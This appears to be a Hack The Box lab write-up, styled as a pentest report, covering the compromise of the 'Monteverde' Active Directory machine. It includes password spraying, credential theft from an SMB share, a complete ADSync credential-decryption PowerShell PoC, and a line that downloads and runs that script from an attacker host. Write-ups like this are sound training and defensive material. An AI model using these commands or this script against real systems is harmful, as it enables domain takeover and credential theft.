+++
date = '2025-06-03T22:03:01+01:00'
draft = false
title = 'Monteverde'
+++
# HTB Monteverde – Full Pentest Report

**Date:** June 3, 2025  
**Tester:** **blackcaesar0**                                                                                                                                            
**Team:** **The Offensive Security Initiative (OSI)**                                                                                                                   
**Target IP:** `10.129.228.111`

**Domain:** MEGABANK.LOCAL  
**Hostname:** MONTEVERDE  

---

### Initial Reconnaissance

In this phase, an Nmap scan was performed to identify open ports, services, and gather initial information about the target. The output below shows all relevant open services and their versions, confirming that this host is part of an Active Directory environment.

```sh
[Jun 03, 2025 - 01:42:17 (UTC)] exegol-HTB Monteverde # nmap -A -O -T4 -Pn -oX Monteverde.xml 10.129.228.111
Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-03 01:43 UTC
Nmap scan report for 10.129.228.111
Host is up (0.093s latency).
Not shown: 989 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-03 01:43:47Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: MEGABANK.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
No OS matches for host
Network Distance: 2 hops
Service Info: Host: MONTEVERDE; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-03T01:44:02
|_  start_date: N/A
```

**Key Observations:**

- Ports 53 (DNS), 88 (Kerberos), 389/3268 (LDAP), 445 (SMB), 464 (Kerberos password change), 593 (RPC over HTTP) are open.
- Presence of Kerberos and LDAP strongly indicates an Active Directory domain controller or domain-joined server.
- SMB signing is required, and SMBv1 is disabled.

### SMB Enumeration

Next, a manual SMB share enumeration was attempted to see if anonymous or null access was allowed.
```sh
[Jun 03, 2025 - 02:10:19 (UTC)] exegol-HTB Monteverde # smbclient -L //megabank.local/ -N                                    
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

**Observations:**

- SMB1 is disabled.
- No shares were listed for anonymous login, indicating that credentials will be required to enumerate further.

###  RPC Enumeration

**Remote Procedure Call (RPC)**, as defined in [RFC 5531](https://datatracker.ietf.org/doc/rfc5531/), allows querying Windows domain information. A null session connection was used to enumerate user accounts and domain groups.

#####  Establishing an RPC Null Session

```sh
[Jun 03, 2025 - 02:10:26 (UTC)] exegol-HTB Monteverde # rpcclient -U '' -N "megabank.local"      
rpcclient $>
```
 
##### User Enumeration (`querydispinfo`)
```md
rpcclient $> querydispinfo
index: 0xfb6 RID: 0x450 acb: 0x00000210 Account: AAD_987d7f2f57d2	Name: AAD_987d7f2f57d2	Desc: Service account for the Synchronization Service with installation identifier 05c97990-7587-4a3d-b312-309adfc172d9 running on computer MONTEVERDE.
index: 0xfd0 RID: 0xa35 acb: 0x00000210 Account: dgalanos	Name: Dimitris Galanos	Desc: (null)
index: 0xedb RID: 0x1f5 acb: 0x00000215 Account: Guest	Name: (null)	Desc: Built-in account for guest access to the computer/domain
index: 0xfc3 RID: 0x641 acb: 0x00000210 Account: mhope	Name: Mike Hope	Desc: (null)
index: 0xfd1 RID: 0xa36 acb: 0x00000210 Account: roleary	Name: Ray O'Leary	Desc: (null)
index: 0xfc5 RID: 0xa2a acb: 0x00000210 Account: SABatchJobs	Name: SABatchJobs	Desc: (null)
index: 0xfd2 RID: 0xa37 acb: 0x00000210 Account: smorgan	Name: Sally Morgan	Desc: (null)
index: 0xfc6 RID: 0xa2b acb: 0x00000210 Account: svc-ata	Name: svc-ata	Desc: (null)
index: 0xfc7 RID: 0xa2c acb: 0x00000210 Account: svc-bexec	Name: svc-bexec	Desc: (null)
index: 0xfc8 RID: 0xa2d acb: 0x00000210 Account: svc-netapp	Name: svc-netapp	Desc: (null)
rpcclient $> enumdomgroups
group:[Enterprise Read-only Domain Controllers] rid:[0x1f2]
group:[Domain Users] rid:[0x201]
group:[Domain Guests] rid:[0x202]
group:[Domain Computers] rid:[0x203]
group:[Group Policy Creator Owners] rid:[0x208]
group:[Cloneable Domain Controllers] rid:[0x20a]
group:[Protected Users] rid:[0x20d]
group:[DnsUpdateProxy] rid:[0x44e]
group:[Azure Admins] rid:[0xa29]
group:[File Server Admins] rid:[0xa2e]
group:[Call Recording Admins] rid:[0xa2f]
group:[Reception] rid:[0xa30]
group:[Operations] rid:[0xa31]
group:[Trading] rid:[0xa32]
group:[HelpDesk] rid:[0xa33]
group:[Developers] rid:[0xa34]
rpcclient $> querydominfo
Domain:		MEGABANK
Server:		
Comment:	
Total Users:	51
Total Groups:	0
Total Aliases:	23
Sequence No:	1
Force Logoff:	-1
Domain Server State:	0x1
Server Role:	ROLE_DOMAIN_PDC
Unknown 3:	0x1

```
**Observations:**

- Discovered user accounts: `AAD_987d7f2f57d2`, `dgalanos`, `mhope`, `roleary`, `SABatchJobs`, `smorgan`, etc.
- Notable group “Azure Admins” (RID: 0xa29).
- Confirmed the domain name (MEGABANK) and that this host is the primary domain controller (ROLE_DOMAIN_PDC).

###  Password Spraying / Brute-Force Attempts

Using the list of usernames gathered from RPC, a brute-force attempt was made by trying each username as its own password against SMB.

```sh
[Jun 03, 2025 - 02:42:49 (UTC)] exegol-HTB Monteverde # nxc smb megabank.local -u users.txt -p users.txt
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:dgalanos STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\smorgan:dgalanos STATUS_LOGON_FAILURE 
...[snip]...
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\:roleary STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\dgalanos:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\Guest:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\mhope:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [-] MEGABANK.LOCAL\roleary:SABatchJobs STATUS_LOGON_FAILURE 
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```
**Result:**

- Valid credentials found:  
    `MEGABANK.LOCAL\SABatchJobs:SABatchJobs`

### Validating `SABatchJobs` Access

#####  WinRM Access Check

Confirmed that `SABatchJobs` does **not** have WinRM privileges.
```sh
[Jun 03, 2025 - 03:27:14 (UTC)] exegol-HTB Monteverde # nxc winrm megabank.local -u SABatchJobs -p SABatchJobs
WINRM       10.129.228.111  5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.129.228.111  5985   MONTEVERDE       [-] MEGABANK.LOCAL\SABatchJobs:SABatchJobs
```
####  SMB Share Enumeration

Listing shares accessible to `SABatchJobs`:
```sh
[Jun 03, 2025 - 03:26:44 (UTC)] exegol-HTB Monteverde # nxc smb megabank.local -u SABatchJobs -p SABatchJobs --shares
SMB         10.129.228.111  445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:False)
SMB         10.129.228.111  445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
SMB         10.129.228.111  445    MONTEVERDE       [*] Enumerated shares
SMB         10.129.228.111  445    MONTEVERDE       Share           Permissions     Remark
SMB         10.129.228.111  445    MONTEVERDE       -----           -----------     ------
SMB         10.129.228.111  445    MONTEVERDE       ADMIN$                          Remote Admin
SMB         10.129.228.111  445    MONTEVERDE       azure_uploads   READ            
SMB         10.129.228.111  445    MONTEVERDE       C$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       E$                              Default share
SMB         10.129.228.111  445    MONTEVERDE       IPC$            READ            Remote IPC
SMB         10.129.228.111  445    MONTEVERDE       NETLOGON        READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       SYSVOL          READ            Logon server share 
SMB         10.129.228.111  445    MONTEVERDE       users$          READ  
```
**Observations:**

- Accessible shares: `azure_uploads`, `users$`, `NETLOGON`, `SYSVOL`, `IPC$`.
- The presence of “azure_uploads” suggests possible Azure AD integration.

#### LDAP Access Check

Ensured that `SABatchJobs` can bind over LDAP:
```sh
[Jun 03, 2025 - 03:27:01 (UTC)] exegol-HTB Monteverde # nxc ldap megabank.local -u SABatchJobs -p SABatchJobs
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
```

**Observations:**

- `SABatchJobs` can authenticate to LDAP, but further LDAP enumeration did not reveal immediately exploitable data.

#### BloodHound Data Collection

Ran a BloodHound collection to gather AD relationships and permissions:
```sh
[Jun 03, 2025 - 03:27:26 (UTC)] exegol-HTB Monteverde # nxc ldap megabank.local -u SABatchJobs -p SABatchJobs --bloodhound -c all --dns-server 10.129.228.111
LDAP        10.129.228.111  389    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
LDAP        10.129.228.111  389    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
LDAP        10.129.228.111  389    MONTEVERDE       Resolved collection methods: trusts, rdp, objectprops, container, psremote, session, dcom, group, acl, localadmin
LDAP        10.129.228.111  389    MONTEVERDE       Done in 00M 20S
LDAP        10.129.228.111  389    MONTEVERDE       Compressing output into /root/.nxc/logs/MONTEVERDE_10.129.228.111_2025-06-03_033404_bloodhound.zip
```

**Observations:**

- BloodHound data was collected but did not reveal an immediate escalation path for `SABatchJobs`.

###  SMB Share Content Enumeration

Since `SABatchJobs` had read access to the “azure_uploads” and “users$” shares, these shares were examined for sensitive files.

#####  `azure_uploads` Share
```sh
[Jun 03, 2025 - 03:41:18 (UTC)] exegol-HTB Monteverde # smbclient  //megabank.local/azure_uploads -U "SABatchJobs%SABatchJobs"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 12:43:06 2020
  ..                                  D        0  Fri Jan  3 12:43:06 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \>
```

**Result:** No files inside the “azure_uploads” directory.

##### `users$` Share
```sh
[Jun 03, 2025 - 03:42:34 (UTC)] exegol-HTB Monteverde # smbclient  //megabank.local/users$ -U "SABatchJobs%SABatchJobs"
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jan  3 13:12:48 2020
  ..                                  D        0  Fri Jan  3 13:12:48 2020
  dgalanos                            D        0  Fri Jan  3 13:12:30 2020
  mhope                               D        0  Fri Jan  3 13:41:18 2020
  roleary                             D        0  Fri Jan  3 13:10:30 2020
  smorgan                             D        0  Fri Jan  3 13:10:24 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \> ls dgalanos\
  .                                   D        0  Fri Jan  3 13:12:30 2020
  ..                                  D        0  Fri Jan  3 13:12:30 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \> ls mhope\
  .                                   D        0  Fri Jan  3 13:41:18 2020
  ..                                  D        0  Fri Jan  3 13:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 13:40:23 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \> ls roleary\
  .                                   D        0  Fri Jan  3 13:10:30 2020
  ..                                  D        0  Fri Jan  3 13:10:30 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \> ls smorgan\
  .                                   D        0  Fri Jan  3 13:10:24 2020
  ..                                  D        0  Fri Jan  3 13:10:24 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \> cd mhope
smb: \mhope\> ls
  .                                   D        0  Fri Jan  3 13:41:18 2020
  ..                                  D        0  Fri Jan  3 13:41:18 2020
  azure.xml                          AR     1212  Fri Jan  3 13:40:23 2020

		31999 blocks of size 4096. 28979 blocks available
smb: \mhope\> get azure.xml 
getting file \mhope\azure.xml of size 1212 as azure.xml (3.1 KiloBytes/sec) (average 3.1 KiloBytes/sec)
smb: \mhope\> 
```
**Observations:**

- The only interesting file found was `azure.xml` inside the `mhope` directory.
- This file was downloaded locally for further analysis.

#### `azure.xml` File Analysis

The contents of `azure.xml` revealed a stored password for the user `mhope`. This credential was used to obtain a low-privilege WinRM shell.
```sh
[Jun 03, 2025 - 03:45:51 (UTC)] exegol-HTB Monteverde # cat azure.xml                                              
��<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>Microsoft.Azure.Commands.ActiveDirectory.PSADPasswordCredential</ToString>
    <Props>
      <DT N="StartDate">2020-01-03T05:35:00.7562298-08:00</DT>
      <DT N="EndDate">2054-01-03T05:35:00.7562298-08:00</DT>
      <G N="KeyId">00000000-0000-0000-0000-000000000000</G>
      <S N="Password">4n0therD4y@n0th3r$</S>
    </Props>
  </Obj>
</Objs>#
```

**Decoded Credential:**

- **Username:** `mhope`
- **Password:** `4n0therD4y@n0th3r$`

###  WinRM Shell as `mhope`

Using the extracted credentials, a WinRM connection was established via Evil-WinRM to obtain a shell as the `mhope` user. The user flag was then captured from the Desktop.
```sh
[Jun 03, 2025 - 03:48:16 (UTC)] exegol-HTB Monteverde # nxc winrm megabank.local -u mhope -p '4n0therD4y@n0th3r$'     
WINRM       10.129.228.111  5985   MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 (name:MONTEVERDE) (domain:MEGABANK.LOCAL)
WINRM       10.129.228.111  5985   MONTEVERDE       [+] 
```

 (Via Evil-WinRM)

![user access](/static/Monteverde/user.jpg)

**Observations:**

- Successfully obtained a low-privilege shell as `mhope`.
- Retrieved the user flag.

#### `mhope` Privilege Enumeration
```powershell 
*Evil-WinRM* PS C:\Users\mhope\desktop> net user mhope
User name                    mhope
Full Name                    Mike Hope
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            1/2/2020 4:40:05 PM
Password expires             Never
Password changeable          1/3/2020 4:40:05 PM
Password required            Yes
User may change password     No

Workstations allowed         All
Logon script
User profile
Home directory               \\monteverde\users$\mhope
Last logon                   1/3/2020 6:29:59 AM

Logon hours allowed          All

Local Group Memberships      *Remote Management Use
Global Group memberships     *Azure Admins         *Domain Users
The command completed successfully.
```

**Observations:**

- `mhope` is a member of the **Azure Admins** group, indicating potential access to Azure AD Connect functionality on this server.

#### Azure AD Sync Enumeration

Since `mhope` belongs to the **Azure Admins** group, Azure AD Connect/Synchronization services were likely present. We checked installed Azure-related programs and running services.

```powershell 
*Evil-WinRM* PS C:\Program Files> Get-ChildItem -Path . -Directory | Where-Object { $_.Name -like '*azure*' } or use ls *azure*


    Directory: C:\Program Files


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         1/2/2020   2:51 PM                Microsoft Azure Active Directory Connect
d-----         1/2/2020   3:37 PM                Microsoft Azure Active Directory Connect Upgrader
d-----         1/2/2020   3:02 PM                Microsoft Azure AD Connect Health Sync Agent
d-----         1/2/2020   2:53 PM                Microsoft Azure AD Sync
```

**Observations:**

- Multiple Azure AD Connect folders exist, including `Microsoft Azure AD Sync`.
- Azure AD Sync relies on a local SQL database named `ADSync`.

#####  Verifying ADSync Database

Verified that SQL Server and the ADSync database were present and running:
```powershell 
*Evil-WinRM* PS C:\temp> sqlcmd -S 127.0.0.1 -E -Q "SELECT name FROM sys.databases"
name
--------------------------------------------------------------------------------------------------------------------------------
master
tempdb
model
msdb
ADSync
```

**Observations:**

- ADSync database is present, confirming Azure AD Sync is configured.

###  Extracting Administrator Credentials via ADSync

A known Proof-of-Concept (PoC) script was used to extract domain administrator credentials from the ADSync database. The default connection string had to be modified for a full TCP instance instead of LocalDB.

#####  Connection String Adjustment

- **Default (LocalDB):**
 ```powershell
 "Data Source=(localdb)\.\ADSync;Initial Catalog=ADSync"
```
- **Updated (TCP Instance):**
```powershell
"Server=127.0.0.1;Database=ADSync;Integrated Security=True"
```

####  AD Connect Sync Credential Extract PoC

  - [AzureAD POC Article](https://blog.xpnsec.com/azuread-connect-for-redteam/)

```powershell
Write-Host "AD Connect Sync Credential Extract POC (@_xpn_)`n"

$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

add-type -path 'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

$domain = select-xml -Content $config -XPath "//parameter[@name='forest-login-domain']" | select @{Name = 'Domain'; Expression = {$_.node.InnerXML}}
$username = select-xml -Content $config -XPath "//parameter[@name='forest-login-user']" | select @{Name = 'Username'; Expression = {$_.node.InnerXML}}
$password = select-xml -Content $decrypted -XPath "//attribute" | select @{Name = 'Password'; Expression = {$_.node.InnerText}}

Write-Host ("Domain: " + $domain.Domain)
Write-Host ("Username: " + $username.Username)
Write-Host ("Password: " + $password.Password)

```

#### Executing the PoC and Capturing Admin Credentials
```powershell
*Evil-WinRM* PS C:\Users\mhope\Documents> iex (New-Object Net.WebClient).DownloadString('http://10.10.14.175/poc.ps1')
AD Connect Sync Credential Extract POC (@_xpn_)

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

**Result:**

- Extracted **Administrator** credentials:  
    `administrator : d0m@in4dminyeah!`

####  Administrator Access & Root Flag

Using the extracted administrator credentials, a WinRM session was established as the domain administrator, and the root flag was retrieved from the Desktop.
```powershell
[Jun 03, 2025 - 05:08:38 (UTC)] exegol-HTB Monteverde # evil-winrm -u "administrator" -p 'd0m@in4dminyeah!' -i "dc.megabank.local"
  
Evil-WinRM shell v3.7
  
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> cat root.txt
28d7c0ae4df442b024ceb5010057838c
*Evil-WinRM* PS C:\Users\Administrator\desktop>
```

**Outcome:**

- Full administrative access confirmed.
- Retrieved the **root flag**

### Conclusion

- **Initial Enumeration:**  
    Nmap scan confirmed an AD environment with SMB, LDAP, Kerberos, and RPC services.
    
- **RPC Enumeration:**  
    Discovered domain user list and group memberships (including “Azure Admins”).
    
- **Credential Discovery:**  
    Valid credential pair (`SABatchJobs:SABatchJobs`) obtained via brute-force (username = password).
    
- **SMB Enumeration:**  
    `SABatchJobs` had read access to `users$` and `azure_uploads` shares.
    
- **Information Disclosure:**  
    Retrieved `azure.xml` from `mhope` home directory containing user credentials (`mhope:4n0therD4y@n0th3r$`).
    
- **Low-Privilege Compromise:**  
    Established WinRM shell as `mhope`, retrieved user flag, and identified membership in “Azure Admins.”
    
- **Privilege Escalation via ADSync:**  
    Enumerated Azure AD Sync database, ran PoC to decrypt and retrieve domain administrator credentials.
    
- **Full Compromise:**  
    Logged in as `administrator` via WinRM, retrieved root flag.
    

**Recommendations:**

1. Enforce strong, unique passwords and disable trivial password reuse.
    
2. Restrict and monitor access to SMB shares, especially user home directories.
    
3. Secure Azure AD Connect configuration and restrict database read access.
    
4. Implement Least Privilege for service accounts (e.g., do not allow “SABatchJobs” to read home directories).
    
5. Regularly audit membership of privileged groups (e.g., “Azure Admins”) and review AD sync account permissions.
